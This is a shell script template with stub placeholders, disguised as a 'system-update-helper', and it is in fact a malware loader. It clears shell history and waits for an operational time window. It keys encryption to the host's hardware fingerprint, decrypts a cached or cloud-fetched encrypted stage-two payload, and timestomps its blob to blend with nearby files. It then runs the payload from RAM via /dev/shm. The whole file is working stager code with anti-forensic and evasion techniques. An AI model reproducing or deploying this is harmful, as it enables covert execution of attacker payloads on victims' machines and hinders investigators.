# system-update-helper v2.1.4

# -- encoded configuration --
_d='STUB_S2_PATH'
_secret='STUB_SECRET'
_f="STUB_BLOB_PATH"
_g='STUB_SALT'
_ws='STUB_WINDOW_START'
_we='STUB_WINDOW_END'

# -- anti-forensic: no history --
unset HISTFILE; export HISTSIZE=0 HISTFILESIZE=0

# -- debug (compile-time, set by wizard) --
STUB_DBG_INIT

# -- time window check (HH:MM format, empty = always run, handles midnight wrap) --
_tw() {
    [ -z "$_ws" ] && return 0
    _n=$(date +%H%M 2>/dev/null) || return 0
    _s=$(printf '%s' "$_ws" | tr -d ':')
    _x=$(printf '%s' "$_we" | tr -d ':')
    if [ "$_s" -le "$_x" ]; then
        [ "$_n" -ge "$_s" ] && [ "$_n" -le "$_x" ]
    else
        [ "$_n" -ge "$_s" ] || [ "$_n" -le "$_x" ]
    fi
}

# -- hardware fingerprint: values NOT present on disk image --
_hw() {
    _u=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null ||
         cat /sys/class/dmi/id/board_serial  2>/dev/null ||
         cat /etc/machine-id                 2>/dev/null || printf 'x')
    _i=$(ip route 2>/dev/null | awk '/default/{print $5; exit}')
    _m=$(cat "/sys/class/net/${_i}/address" 2>/dev/null ||
         ip link 2>/dev/null | awk '/ether/{print $2; exit}' ||
         printf '0')
    printf '%s%s%s' "$_u" "$_m" "$_g" | sha256sum 2>/dev/null | tr -d ' -'
}

# -- AES-256-GCM decrypt for stage2 (HIGH-2: authenticated encryption) --
# Wire format: "SGCM:" + base64(salt[8] + nonce[12] + ciphertext + tag[16])
# Key: PBKDF2-HMAC-SHA256(password, salt, 210000, 32 bytes)
_dec() {
    python3 -c "
import sys,base64,hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
pw=sys.argv[1].encode(); blob=sys.stdin.read().strip()
if not blob.startswith('SGCM:'): sys.exit(1)
raw=base64.b64decode(blob[5:])
salt,nonce,ct=raw[:8],raw[8:20],raw[20:]
dk=PBKDF2HMAC(hashes.SHA256(),32,salt,210000).derive(pw)
sys.stdout.buffer.write(AESGCM(dk).decrypt(nonce,ct,None))
" "$1" 2>/dev/null
}
# -- AES-256-CBC encrypt for hw-keyed local blob (bash-written blobs) --
_enc() {
    openssl enc -aes-256-cbc -pbkdf2 -iter 210000 -md sha256 \
        -pass "pass:${1}" -base64 -A 2>/dev/null
}
# -- decrypt hw-keyed local blob: GCM (written by Rust ELF) or CBC (written by bash stub) --
_dec_blob() {
    _blob=$(cat)
    case "$_blob" in
        SGCM:*)
            printf '%s' "$_blob" | _dec "$1"
            ;;
        *)
            printf '%s' "$_blob" | openssl enc -d -aes-256-cbc -pbkdf2 -iter 210000 -md sha256 \
                -pass "pass:${1}" -base64 -A 2>/dev/null
            ;;
    esac
    unset _blob
}

# -- timestomp blob to match neighboring files --
_ts() {
    _dir=$(dirname "$_f")
    _ref=$(ls -t "$_dir" 2>/dev/null | grep -v "^$(basename "$_f")$" | head -1)
    if [ -n "$_ref" ]; then
        touch -r "${_dir}/${_ref}" "$_f" 2>/dev/null
    else
        _ref=$(ls -t "$(dirname "$_dir")" 2>/dev/null | grep -v "^$(basename "$_dir")$" | head -1)
        _parent=$(dirname "$_dir")
        if [ -n "$_ref" ] && [ -f "${_parent}/${_ref}" ]; then
            touch -r "${_parent}/${_ref}" "$_f" 2>/dev/null
        else
            touch -r /bin/bash "$_f" 2>/dev/null
        fi
    fi
}

# -- launch --
_exec() {
    export STUB_PATH="$(readlink -f "$0" 2>/dev/null || echo "$0")"
    if [ -d /dev/shm ]; then
        _t=$(mktemp /dev/shm/.XXXXXXXX 2>/dev/null) || { eval "$1"; return; }
        printf '%s' "$1" > "$_t"
        chmod 700 "$_t"
        exec bash "$_t" ${_vf}    # replace this process; file lives in RAM only
    fi
    eval "$1"
}

# ---- MAIN ----

# wait outside operational window
_log "checking time window..."
while ! _tw; do sleep 300 2>/dev/null; done
_log "time window OK"

# ---- path 0: local hw-encrypted blob (ddb-first) ----
_log "checking local blob: $_f"
if [ -f "$_f" ]; then
    _log "local blob found, decrypting..."
    _k=$(_hw)
    _t=$(mktemp 2>/dev/null) || _t="/tmp/._$$"
    _dec_blob "$_k" < "$_f" > "$_t" 2>/dev/null
    if [ "$(dd if="$_t" bs=8 count=1 2>/dev/null)" = "STRATUM:" ]; then
        _log "magic prefix OK — executing local stage2"
        export _BLOB_PATH="$_f"
        _ts
        _data=$(tail -c +9 "$_t" 2>/dev/null)
        rm -f "$_t" 2>/dev/null; unset _k _t
        _exec "$_data"
        exit $?
    fi
    _log "magic prefix mismatch (hw fingerprint changed?)"
    rm -f "$_t" 2>/dev/null; unset _k _t
fi

# ---- path 1: cloud (retry up to 5 times with jitter on transient failure) ----
_log "blob miss — fetching from cloud..."
_attempt=0
while [ "$_attempt" -lt 5 ]; do
    _attempt=$(( _attempt + 1 ))
    _log "fetching access token (attempt ${_attempt}/5)..."
    _token=$(_tk)
    if [ -z "$_token" ]; then
        _log "token fetch failed"
        _rnd=$(od -An -N1 -tu1 /dev/urandom | tr -d ' ')
        _backoff=$(( 30 * _attempt + (_rnd % 30) ))
        _log "retrying in ${_backoff}s..."
        sleep "$_backoff" 2>/dev/null
        continue
    fi
    _log "token acquired"
    _log "fetching encrypted stage2: $_d"
    _s2enc=$(_dl "$_token" "$_d")
    if [ -z "$_s2enc" ]; then
        _log "stage2 fetch failed"
        unset _token
        _rnd=$(od -An -N1 -tu1 /dev/urandom | tr -d ' ')
        _backoff=$(( 30 * _attempt + (_rnd % 30) ))
        _log "retrying in ${_backoff}s..."
        sleep "$_backoff" 2>/dev/null
        continue
    fi
    _log "stage2 downloaded ($(printf '%s' "$_s2enc" | wc -c) bytes)"
    _log "decrypting stage2 with stub_secret..."
    _raw=$(printf '%s' "$_s2enc" | _dec "$_secret")
    case "$_raw" in
        STRATUM:*)
            _s2="${_raw#STRATUM:}"
            _log "stage2 decrypted OK ($(printf '%s' "$_s2" | wc -c) bytes)"
            unset _raw _s2enc
            _log "caching hw-encrypted local blob..."
            _k=$(_hw)
            _bdir=$(dirname "$_f")
            export _BLOB_TRIED="$_f"
            mkdir -p "$_bdir" 2>/dev/null
            printf '%s' "STRATUM:${_s2}" | _enc "$_k" > "$_f" 2>/dev/null
            chmod 600 "$_f" 2>/dev/null
            export _BLOB_PATH="$_f"
            _ts
            unset _k _bdir
            _log "starting..."
            _exec "$_s2"
            exit $?
            ;;
        *)
            _log "stage2 decryption failed — not retrying"
            unset _raw _s2enc _token
            break
            ;;
    esac
done
unset _attempt _backoff _rnd _token

_log "no agent available — exit 1"
exit 1
